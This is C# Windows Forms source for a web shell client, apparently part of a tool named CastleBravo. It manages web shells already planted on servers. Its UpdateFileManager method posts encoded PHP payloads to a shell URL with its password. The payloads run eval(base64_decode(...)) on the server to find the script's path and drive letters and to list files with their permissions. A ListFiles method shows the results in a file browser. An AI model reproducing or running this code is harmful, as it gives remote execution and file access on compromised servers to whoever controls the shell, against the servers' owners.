using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;
using System.Windows.Forms;

namespace C2.Business.CastleBravo.WebShellTool
{
    public partial class WebShellDetails : Form
    {
        private WebShellTaskInfo webShellTaskInfo;
        private WebShell webShell;
        private List<WSFile> filesInCurrentFolder = new List<WSFile>();
        private List<WSFolder> foldersInCurrentFolder = new List<WSFolder>();

        public WebShellDetails()
        {
            InitializeComponent();
        }

        public WebShellDetails(WebShellTaskInfo taskInfo) : this()
        {
            webShellTaskInfo = taskInfo;
            webShell = new WebShell(taskInfo.TaskUrl, taskInfo.TaskPwd);
        }

        private void TabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (tabControl1.SelectedTab.Text == "文件管理")
                UpdateFileManager();
        }

        private void UpdateFileManager()
        {
            /*
             * TODO
             *  1、发报文查询
             *  2、结果解析
             *  3、界面展示
             */
            WebClient client = new WebClient();

            byte[] postData = Encoding.UTF8.GetBytes(webShellTaskInfo.TaskPwd + "=%40ini_set(%22display_errors%22%2c%220%22)%3b%0d%0a%40set_time_limit(0)%3b%0d%0a%40set_magic_quotes_runtime(0)%3b%0d%0aprint(%22-%3e%7c%22)%3b%0d%0aeval(base64_decode(%24_POST%5bz%5d))%3b%0d%0aprint(%22%7c%3c-%22)%3b%0d%0adie()%3b&z=JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOw0KaWYoJEQ9PSIiKSAkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7DQokUj0ieyREfVx0IjsNCmlmKHN1YnN0cigkRCwwLDEpIT0iLyIpDQp7DQoJZm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTCkNCgkJaWYoaXNfZGlyKCJ7JEx9OiIpKQ0KCQkJJFIuPSJ7JEx9OiAiOw0KfQ0KZWxzZSAkUi49Ii8iOw0KcHJpbnQgJFI7");
            client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
            byte[] responseData = client.UploadData(webShellTaskInfo.TaskUrl, "POST", postData);//得到返回字符流  
            string result = Encoding.UTF8.GetString(responseData);//解码 

            string pattern = @"->\|(?<Result>.*)\|<-";
            Regex regex = new Regex(pattern, RegexOptions.Singleline);
            Match m = regex.Match(result);
            if (m.Success)
            {
                string tmpPath = m.Groups["Result"].Value.TrimEnd(new char[] { '/', ' ', '\t'}) + '/';

                var bPath = System.Text.Encoding.UTF8.GetBytes(tmpPath);
                string path = System.Convert.ToBase64String(bPath);

                client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                byte[] postData2 = Encoding.UTF8.GetBytes(webShellTaskInfo.TaskPwd + "=%40ini_set(%22display_errors%22%2c%220%22)%3b%0d%0a%40set_time_limit(0)%3b%0d%0a%40set_magic_quotes_runtime(0)%3b%0d%0aprint(%22-%3e%7c%22)%3b%0d%0aeval(base64_decode(%24_POST%5bf%5d))%3b%0d%0aprint(%22%7c%3c-%22)%3b%0d%0adie()%3b&f=JEQ9YmFzZTY0X2RlY29kZSgkX1BPU1RbImIiXSk7DQokZj1Ab3BlbmRpcigkRCk7DQppZiAoJGY9PU5VTEwpIHsNCiAgICBwcmludCgiRVJST1I6Ly9QYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uIik7DQp9DQplbHNlIHsNCiAgICAkTT1OVUxMOw0KICAgICRMPU5VTEw7DQogICAgd2hpbGUgKCROPUByZWFkZGlyKCRmKSkgew0KICAgICAgICBpZiAoJE4gIT0gJy4nICYmICROICE9ICcuLicpIHsNCiAgICAgICAgICAgICRQPSRELicvJy4kTjsNCiAgICAgICAgICAgICRUPUBkYXRlKCdZLW0tZCBIOmk6cycsZmlsZW10aW1lKCRQKSk7DQogICAgICAgICAgICAkUz1Ac3ByaW50ZignJXUnLCBAZmlsZXNpemUoJFApKTsNCiAgICAgICAgICAgICRFPUBzdWJzdHIoYmFzZV9jb252ZXJ0KEBmaWxlcGVybXMoJFApLDEwLDgpLC00KTsNCiAgICAgICAgICAgIGlmIChAaXNfZGlyKCRQKSkgJE4uPScvJzsNCiAgICAgICAgICAgICRNLj0kTi4iXHQiLiRULiJcdCIuJFMuIlx0Ii4kRS4iXG4iOw0KICAgICAgICB9DQogICAgfQ0KICAgIHByaW50ICRNOw0KICAgIEBjbG9zZWRpcigkZik7DQp9&b=" + HttpUtility.UrlEncode(path));
                byte[] responseData2 = client.UploadData(webShellTaskInfo.TaskUrl, "POST", postData2);
                string result2 = Encoding.UTF8.GetString(responseData2);//解码 
                MessageBox.Show(result2);
            }


        }


        private void ListFiles(String path)
        {
            fileManagerListView.Items.Clear();
            Tuple<List<WSFolder>, List<WSFile>, string> data = webShell.browse(path);
            filePathTb.Text = data.Item3; //set the realpath
            this.foldersInCurrentFolder = data.Item1;
            this.filesInCurrentFolder = data.Item2;

            foreach (WSFolder oneFolder in data.Item1)
            {
                ListViewItem lvi = new ListViewItem(new string[] { oneFolder.name, "0", "", oneFolder.permisions });
                lvi.ImageIndex = 0;
                lvi.Tag = "folder";
                lvi.Name = oneFolder.name;
                fileManagerListView.Items.Add(lvi);
            }

            foreach (WSFile oneFile in data.Item2)
            {
                ListViewItem lvi = new ListViewItem(new string[] { oneFile.name, oneFile.size, oneFile.lastMod, oneFile.permisions });
                lvi.ImageIndex = 1;
                lvi.Tag = "file";
                lvi.Name = oneFile.name;
                fileManagerListView.Items.Add(lvi);

                for (int i = 0; i < imageList1.Images.Count; i++) // set image with mime type
                {
                    if (oneFile.type.Contains(imageList1.Images.Keys[i].ToString()))
                    {
                        lvi.ImageIndex = i;
                        break;
                    }
                }
            }
        }
    }
}
